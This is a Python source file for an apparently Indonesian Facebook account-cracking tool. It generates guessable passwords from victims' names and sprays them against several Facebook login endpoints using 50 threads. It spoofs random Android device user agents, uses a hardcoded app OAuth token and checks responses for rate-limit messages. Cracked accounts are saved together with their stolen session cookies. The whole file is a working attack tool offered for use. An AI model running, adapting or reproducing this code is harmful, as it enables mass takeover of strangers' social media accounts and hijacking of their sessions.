import time, json, requests, uuid, random, os, string, hashlib, re, base64

from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from .Password import Pws
from .Module import Tod
from bluid.logo import Logo
from bluid.data import UserAgent

H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
N = '\x1b[0m'	 # WARNA MATI
R = "\x1b[0;31m" # Merah

class Kynaa:

    def __init__(self, id, aw):
        self.asu, self.asw = id, aw
        self.ses = requests.Session()
        self.ok, self.cp, self.lop = 0, 0, 0

    def save_hasil(self, filename, data):
        with open(filename, "a") as file:
            file.write(data + "\n")

    def print_proses(self, code, gp):
        if code == 200:
            kyna = f"{H}200{N}"
        elif code == 400:
            kyna = f"{R}400{N}"
        elif code == 401:
            kyna = f"{R}401{N}"
        elif code == 403:
            kyna = f"{R}403{N}"
        elif code == 404:
            kyna = f"{R}404{N}"
        elif code == 429:
            kyna = f"{R}429{N}"
        elif code == 500:
            kyna = f"{R}500{N}"
        else:
            kyna = f"{R}{code}{N}"

        print(f"\r[{gp}]-[{kyna}] {str(self.lop)}/{len(self.asu)} OK-:{H}{self.ok}{N} CP-:{K}{self.cp}{N} ", end="")

    def notice(self, tod):
        if tod in "graph_v1":
            kyna = f"{H}         PROSES CRACK METODE GRAPH V1{N}"
        elif tod in "graph_v2":
            kyna = f"{H}         PROSES CRACK METODE GRAPH V2{N}"
        elif tod in "valid_v1":
            kyna = f"{H}         PROSES CRACK METODE VALID V1{N}"
        else:
            kyna = f"{H}         PROSES CRACK METODE VALID V2{N}"
        return kyna

    def abcd(self, asu):
        pwnya = []
        print(f"\n[!] gunakan , (koma) untuk pemisah contoh : {K}123456,anjing,dll{N}. setiap kata minimal 6 karakter atau lebih")
        pwek = input(f"\n[{H}?{N}] masukan kata sandi tambahan (opsional) : ")
        password_manual=pwek.split(',')
        for xpw in password_manual:
            pwnya.append(xpw)
        print(f"[{H}*{N}] sandi tambahan -> [ {H}{pwek}{N} ]")

        user_agent_status = "UserAgent yang disetting" if os.path.exists("data/cache/.sett_UaFB.json") else "UserAgent bawaan script"
        print(f"[{H}#{N}] anda saat ini menggunakan {H}{user_agent_status}{N}")
        time.sleep(3)
        Logo("fesnuk")
        print(self.asw)
        print("     " + self.notice(asu) + "\n"+ "         ---------------------------------------")
        print("             ON-OFF MODE PESAWAT SETIAP 200 ID")
        print("         ---------------------------------------")#ips = Tod().get_ip()
        print()
        with ThreadPoolExecutor(max_workers=50) as executor:
            for user in self.asu:
                uid,nama = user.split('|')[0],user.split('|')[1].lower()
                depan = nama.split(" ")[0]
                try:blkg = nama.split(' ')[1]
                except:blkg = depan
                pasw = []
                if len(nama)<=5:
                    if len(depan)<3:
                        pass
                    else:
                        pasw.append(nama)
                        pasw.append(depan+"123")
                        pasw.append(depan+"1234")
                        pasw.append(depan+"12345")
                        pasw.append(depan+"123456")
                        pasw.append(depan+"01")
                        pasw.append(depan+"02")
                        pasw.append(depan+"05")
                        pasw.append(depan+"11")
                        pasw.append(depan+"12")
                else:
                    if len(depan)<3:
                        pasw.append(nama)				
                    else:
                        pasw.append(nama)
                        pasw.append(depan+"123")
                        pasw.append(depan+"1234")
                        pasw.append(depan+"12345")
                        pasw.append(depan+"123456")
                        pasw.append(depan+"01")
                        pasw.append(depan+"02")
                        pasw.append(depan+"11")
                        pasw.append(depan+"12")

                for xpwd in pwnya:
                    pasw.append(xpwd)
                    #passwords = Pws().generate_passwords(nama, asal, pwek)

                if "graph_v1" in asu:
                    executor.submit(self.graph_v1, uid, pasw)
                elif "graph_v2" in asu:
                    executor.submit(self.graph_v2, uid, pasw)
                elif "valid_v1" in asu:
                    executor.submit(self.reguller, uid, pasw, "https://touch.facebook.com/login.php?", "VALID V1") #"x.facebook.com", "VALID V1")
                else:
                    executor.submit(self.reguller, uid, pasw, "https://x.facebook.com/login.php?", "VALID V2")



        exit("\n[#] Cracking selesai.")

#-----------------------   APIIII --------------------------------------
    def print_proses_api(self, response_text, gp):
        spam_patterns = [
            r"Anda Tidak Dapat Menggunakan Fitur Ini Sekarang",
            r"fallback_triggered\":\s*true",
            r"membatasi seberapa sering Anda dapat",
            r"terlalu banyak percobaan",
            r"terkena batas",
            r"aktivitas mencurigakan",
            r"sementara diblokir",
            r"silakan coba lagi nanti"
        ]
        if any(re.search(pattern, response_text, re.IGNORECASE) for pattern in spam_patterns):
            kyna = f"{R}spam{N}"
        elif "access_token" in response_text:
            kyna = f"{H}sksk{N}"
        else:
            kyna = f"{H}aman{N}"

        print(f"\r[{gp}]-[{kyna}] {str(self.lop)}/{len(self.asu)} OK-:{H}{self.ok}{N} CP-:{K}{self.cp}{N} ", end="")


    def random_float(self, min_val, max_val):
        return round(random.uniform(min_val, max_val), 2)
    
    def random_int(self, min_val, max_val):
        return random.randint(min_val, max_val)

    def generate_random_user_agent_api(self):
        mi_models = random.choice([
            "Mi 10", "Mi 10 Lite (5G)", "Mi 10 Lite Zoom", "Mi 10 Pro", "Mi 10 Ultra",
            "Mi 11", "Mi 11 (5G)", "Mi 11 LE", "Mi 11 Lite", "Mi 11 Lite (5G)", "Mi 11 Lite 5G NE",
            "Mi 11 Lite NE (5G)", "Mi 11 Pro", "Mi 11 Pro (5G)", "Mi 11 Ultra (5G)", "Mi 11i",
            "Mi 11i (5G)", "Mi 11T (5G)", "Mi 11T Pro", "Mi 11T Pro (5G)", "Mi 11X",
            "Mi 11X Pro (5G)", "Mi 12 Pro", "Mi 12T Pro", "Redmi 5 pro", "Redmi 5Plus",
            "Redmi 85781", "2201116SI", "M2012K11AI", "22011119TI", "21091116UI",
            "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C",
            "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C",
            "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC",
            "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG"
        ])
        pixel_models = random.choice([
            "Pixel 2", "Pixel 2 XL", "Pixel 3", "Pixel 3 XL", "Pixel 3A", "Pixel 3A XL",
            "Pixel 4", "Pixel 4 XL", "Pixel 4a", "Pixel 4a (5G)", "Pixel 5", "Pixel 5a (5G)",
            "Pixel 6", "Pixel 6 Pro", "Pixel 6a", "Pixel 7", "Pixel 7 Pro", "Pixel 7a",
            "Pixel 8", "Pixel 8 Pro", "Pixel 8 Pro (5G)", "Pixel 8a", "Pixel 9", "Pixel 9 Pro",
            "Pixel 9 Pro Fold", "Pixel 9 Pro XL"
        ])
        ver_os = random.choice(['9|PPR1', '10|QP1A', '11|RP1A', '12|SP1A', '13|TP1A', '14|UP1A'])
        android = ver_os.split("|")[0]
        density, width, height = self.random_float(1.0, 4.0), self.random_int(720, 1440), self.random_int(1280, 2560)
        carrier = random.choice(['Telkomsel', 'XL', 'Indosat', 'Smartfren', 'Tri'])
        device = random.choice([f'google|{pixel_models}', f'xiaomi|{mi_models}'])
        device_brand, device_model = device.split("|")[0], device.split("|")[1]
        return f'[FBAN/FB4A;FBAV/486.0.0.{str(random.randint(10,99))}.{str(random.randint(10,99))};FBBV/{str(random.randint(653066364,953066364))};FBDM/{{density={density},width={width},height={height}}};FBLC/id_ID;FBRV/0;FBCR/{carrier};FBMF/{device_brand.capitalize()};FBBD/{device_brand};FBPN/com.facebook.mahos;FBDV/{device_model};FBSV/{android};FBOP/1;FBCA/arm64-v8a:;]'


    def graph_v1(self, user, pasw):
        print(f"\r[GRAPH V1] {str(self.lop)}/{len(self.asu)} OK-:{H}{self.ok}{N} CP-:{K}{self.cp}{N} ", end="")
        for pw in pasw:
            try:
                ses = requests.Session()
                ua = self.generate_random_user_agent_api()
                ses.headers.update({
                    'host': 'b-graph.facebook.com',
                    'x-fb-connection-type': 'MOBILE.LTE',
                    'x-zero-state': 'unknown',
                    'user-agent': ua,
                    'x-tigon-is-retry': 'False',
                    'x-fb-device-group': '4783',
                    'x-graphql-request-purpose': 'fetch',
                    'x-fb-privacy-context': '3643298472347298',
                    'x-fb-friendly-name': 'FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request',
                    'x-graphql-client-library': 'graphservice',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-net-hni': '51011',
                    'x-fb-sim-hni': '51011',
                    'authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                    'x-fb-request-analytics-tags': '{"network_tags":{"product":"350685531728","purpose":"fetch","request_category":"graphql","retry_attempt":"0"},"application_tags":"graphservice"}',
                    'accept-encoding': 'gzip, deflate',
                    'x-fb-http-engine': 'Tigon/Liger',
                    'x-fb-client-ip': 'True',
                    'x-fb-server-cluster': 'True'
                })
                enpas = '#PWD_FB4A:0:{}:{}'.format(str(int(time.time())), pw)
                data = {
                    'method': "post",
                    'pretty': "false",
                    'format': "json",
                    'server_timestamps': "true",
                    'locale': "id_ID",
                    'purpose': "fetch",
                    'fb_api_req_friendly_name': "FbBloksActionRootQuery-com.bloks.www.bloks.caa.login.async.send_login_request",
                    'fb_api_caller_class': "graphservice",
                    'client_doc_id': "119940804214876861379510865434",
                    'variables': json.dumps({"params":{"params":"{\"params\":\"{\\\"client_input_params\\\":{\\\"sim_phones\\\":[],\\\"secure_family_device_id\\\":\\\"67db191d-c496-4ce6-b16a-40d465504065\\\",\\\"attestation_result\\\":{\\\"data\\\":\\\"eyJjaGFsbGVuZ2Vfbm9uY2UiOiIrZHJubFJJdndKSkxmUnR4TkdLRWlscWRHOUc2KzJPZWdsY1gyN1d0UEEwPSIsInVzZXJuYW1lIjoieHlhZmFqYXJAZ21haWwuY29tIn0=\\\",\\\"signature\\\":\\\"MEQCIDireQS4hTnMyBiyJckHln2WFJ65OU6a31Bx6JGyCjttAiBpZw4ixxyyyNNC0xMgiqmiAd1rVi8ZGsfyTrqvBIibqw==\\\",\\\"keyHash\\\":\\\"f344d852976b8878bd5ccda3f95074528c7564fcebcde45abc51c9b43bc234e4\\\"},\\\"has_granted_read_contacts_permissions\\\":0,\\\"auth_secure_device_id\\\":\\\"\\\",\\\"has_whatsapp_installed\\\":1,\\\"password\\\":\\\""+enpas+"\\\",\\\"sso_token_map_json_string\\\":\\\"\\\",\\\"event_flow\\\":\\\"login_manual\\\",\\\"password_contains_non_ascii\\\":\\\"false\\\",\\\"sim_serials\\\":[],\\\"client_known_key_hash\\\":\\\"\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"has_granted_read_phone_permissions\\\":0,\\\"app_manager_id\\\":\\\"\\\",\\\"should_show_nested_nta_from_aymh\\\":0,\\\"device_id\\\":\\\"41889e22-bee8-4c81-8ec6-add9a221bd3f\\\",\\\"login_attempt_count\\\":1,\\\"machine_id\\\":\\\"\\\",\\\"flash_call_permission_status\\\":{\\\"READ_PHONE_STATE\\\":\\\"DENIED\\\",\\\"READ_CALL_LOG\\\":\\\"DENIED\\\",\\\"ANSWER_PHONE_CALLS\\\":\\\"DENIED\\\"},\\\"accounts_list\\\":[{},{}],\\\"family_device_id\\\":\\\"f7eab582-f690-4123-b350-132bb5ec5500\\\",\\\"fb_ig_device_id\\\":[],\\\"device_emails\\\":[],\\\"try_num\\\":1,\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\",\\\"lara_override\\\":\\\"\\\"},\\\"event_step\\\":\\\"home_page\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"openid_tokens\\\":{},\\\"contact_point\\\":\\\""+user+"\\\"},\\\"server_params\\\":{\\\"should_trigger_override_login_2fa_action\\\":0,\\\"is_from_logged_out\\\":0,\\\"should_trigger_override_login_success_action\\\":0,\\\"login_credential_type\\\":\\\"none\\\",\\\"server_login_source\\\":\\\"login\\\",\\\"waterfall_id\\\":\\\"12020f76-d875-4059-82fc-93f8debb8784\\\",\\\"login_source\\\":\\\"Login\\\",\\\"is_platform_login\\\":0,\\\"pw_encryption_try_count\\\":1,\\\"INTERNAL__latency_qpl_marker_id\\\":36707139,\\\"offline_experiment_group\\\":\\\"caa_iteration_v6_perf_fb_2\\\",\\\"is_from_landing_page\\\":0,\\\"password_text_input_id\\\":\\\"6vcvjp:102\\\",\\\"is_from_empty_password\\\":0,\\\"is_from_msplit_fallback\\\":0,\\\"ar_event_source\\\":\\\"login_home_page\\\",\\\"username_text_input_id\\\":\\\"6vcvjp:101\\\",\\\"layered_homepage_experiment_group\\\":null,\\\"device_id\\\":\\\"41889e22-bee8-4c81-8ec6-add9a221bd3f\\\",\\\"INTERNAL__latency_qpl_instance_id\\\":4.154659090078E13,\\\"reg_flow_source\\\":\\\"login_home_native_integration_point\\\",\\\"is_caa_perf_enabled\\\":1,\\\"credential_type\\\":\\\"password\\\",\\\"is_from_password_entry_page\\\":0,\\\"caller\\\":\\\"gslr\\\",\\\"family_device_id\\\":\\\"f7eab582-f690-4123-b350-132bb5ec5500\\\",\\\"is_from_assistive_id\\\":0,\\\"access_flow_version\\\":\\\"F2_FLOW\\\",\\\"is_from_logged_in_switcher\\\":0}}\"}","bloks_versioning_id":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5","app_id":"com.bloks.www.bloks.caa.login.async.send_login_request"},"scale":"3","nt_context":{"using_white_navbar":True,"styles_id":"cfe75e13b386d5c54b1de2dcca1bee5a","pixel_ratio":3,"is_push_on":True,"debug_tooling_metadata_token":None,"is_flipper_enabled":False,"theme_params":[],"bloks_version":"3711cb070fe0ab5acd59ae663b1ae4dc75db6f0c463d26a232fd9d72a63fb3e5"}}),
                    'fb_api_analytics_tags': '["GraphServices"]',
                    'client_trace_id': str(uuid.uuid4())
                }
                response = ses.post('https://b-graph.facebook.com/graphql', data=data, allow_redirects=True)
                #response_text = response.text
                #self.print_proses_api(response_text, note)

                if "c_user" in response.text.replace('\\', '') and "access_token" in response.text:
                    self.ok+=1
                    cokie = {
                        "datr": re.search('"name":"datr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
                        "sb": base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-"),
                        "fr": re.search('"name":"fr","value":"(.*?)"', response.text.replace('\\', '')).group(1),
                        "c_user": re.search('"name":"c_user","value":"(\d+)"', response.text.replace('\\', '')).group(1),
                        "xs": re.search('"name":"xs","value":"(.*?)"', response.text.replace('\\', '')).group(1),
                    }
                    cookie = ';'.join(f'{key}={value}' for key, value in cokie.items())
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}|{cookie}{N}")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}|{cookie}")
                    break
                elif 'com.bloks.www.ap.two_step_verification.entrypoint_async' in response.text:
                    self.cp+=1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)
            #except Exception as e:
            #    print(e)

        self.lop+=1


    def graph_v2(self, user, pasw):
        print(f"\r[GRAPH V2] {str(self.lop)}/{len(self.asu)} OK-:{H}{self.ok}{N} CP-:{K}{self.cp}{N} ", end="")
        for pw in pasw:
            try:
                ses = requests.Session()
                ua = self.generate_random_user_agent_api()
                data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'family_device_id': str(uuid.uuid4()),
                'secure_family_device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'try_num': '1',
                'email': user,
                'password': pw,
                'method': 'auth.login',
                'generate_session_cookies': '1',
                'sim_serials': "['80973453345210784798']",
                'openid_flow': 'android_login',
                'openid_provider': 'google',
                'openid_emails': "['01710940017']",
                'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ...']",
                'error_detail_type': 'button_with_disabled',
                'source': 'account_recovery',
                'locale': 'id_ID',
                'client_country_code': 'ID',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'AuthOperations$PasswordAuthOperation'
                }
                headers = {
                'Host': 'graph.facebook.com',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Priority': 'u=3, i',
                'User-Agent': ua,
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                }
                curl = 'https://b-graph.facebook.com/auth/login'
                response = ses.post(curl,data=data, headers=headers)
                q = response.json()
                #self.print_proses_api(response.text, note)

                if "session_key" in q:
                    self.ok += 1
                    datr = base64.b64encode(os.urandom(18)).decode().replace("=", "").replace("+", "_").replace("/", "-")
                    cokz = ";".join(i["name"] + "=" + i["value"] for i in q["session_cookies"])
                    coki = f"datr={datr};{cokz};m_pixel_ratio=1.25;dpr=1.25;wd=448x931;"
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}|{coki}{N}            ")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}|{coki}")
                    break
                elif "User must verify their account" in q["error"]["message"]:
                    self.cp += 1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)
            #except Exception as e:
            #    print(e)

        self.lop+=1

#-----------------------   VALIDATE --------------------------------------
    """
    def validate(self, user, pasw, ips, host, note):
        ss = requests.Session()
        for pw in pasw:
            try:
                rr = random.randint
                ua = UserAgent().ua_facebook("bkn")
                self.print_proses(kyan.status_code, note)
                if "c_user" in ss.cookies.get_dict().keys():
                    self.ok += 1
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ss.cookies.get_dict().items() ])
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}|{coki}{N}")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}|{coki}")
                    break
                elif "checkpoint" in ss.cookies.get_dict().keys():
                    self.cp += 1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)

        self.lop+=1
"""
#-----------------------   REGULER --------------------------------------

    def reguller(self, user, pasw, ips, host, note):
        ss = requests.Session()
        for pw in pasw:
            try:
                rr = random.randint
                ua = UserAgent().ua_fb_val()

                kyan = ss.get(host)
                kyna = BeautifulSoup(kyan.text, "html.parser")
                data = {
                    "lsd": kyna.find("input", {"name": "lsd"})["value"],
                    "jazoest": kyna.find("input", {"name": "jazoest"})["value"],
                    "m_ts": kyna.find("input", {"name": "m_ts"})["value"],
                    "li": kyna.find("input", {"name": "li"})["value"],
                    "try_number": "0", "unrecognized_tries": "0", "prefill_contact_point": user, "prefill_source": "provided_or_soft_matched", "prefill_type": "contact_point",
                    "first_prefill_source": "provided_or_soft_matched", "first_prefill_type": "contact_point", "had_cp_prefilled": "true", "had_password_prefilled": "false",
                    "is_smart_lock": "false", "_fb_noscript": "true", "email": user, "pass": pw
                }

                apcb = ss.cookies.get_dict()
                head = {
                    'authority': 'x.facebook.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'cache-control': 'max-age=0', 'content-type': 'application/x-www-form-urlencoded',
                    'dpr': '1.600000023841858', 'origin': 'https://x.facebook.com', 'referer': 'https://x.facebook.com/', 'accept-encoding': 'br, gzip',
                    'sec-ch-prefers-color-scheme': 'dark', 'sec-ch-ua': f'"Not.A/Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(40,114))}", "Google Chrome";v="{str(rr(40,114))}"',
                    'sec-ch-ua-full-version-list': f'"Not.A/Brand";v="{str(rr(8,20))}.0.0.0", "Chromium";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}", "Google Chrome";v="{str(rr(40,114))}.0.{str(rr(2000,5999))}.{str(rr(10,399))}"',
                    'sec-ch-ua-mobile': '?0', 'sec-ch-ua-model': '""', 'sec-ch-ua-platform': '"Linux"', 'sec-ch-ua-platform-version': '""', 'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate', 'sec-fetch-site': 'same-origin', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'viewport-width': '980'
                }
                szaz = ss.post(
                    f"https://www.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=9",
                    data=data,
                    headers=head,
                    cookies=apcb,
                    allow_redirects=False
                )

                self.print_proses(kyan.status_code, note)
                if "c_user" in ss.cookies.get_dict().keys():
                    self.ok += 1
                    coki = (";").join([ "%s=%s" % (key, value) for key, value in ss.cookies.get_dict().items() ])
                    print(f"\r[{H}OK{N}]{H} {user}|{pw}|{coki}{N}")
                    self.save_hasil(f"data/result/OK/OK-{Tod().tggl()}.txt", f"{user}|{pw}|{coki}")
                    break
                elif "checkpoint" in ss.cookies.get_dict().keys():
                    self.cp += 1
                    print(f"\r[{K}CP{N}]{K} {user}|{pw}{N}            ")
                    self.save_hasil(f"data/result/CP/CP-{Tod().tggl()}.txt", f"{user}|{pw}")
                    break
            except requests.exceptions.ConnectionError:
                time.sleep(15)

        self.lop+=1
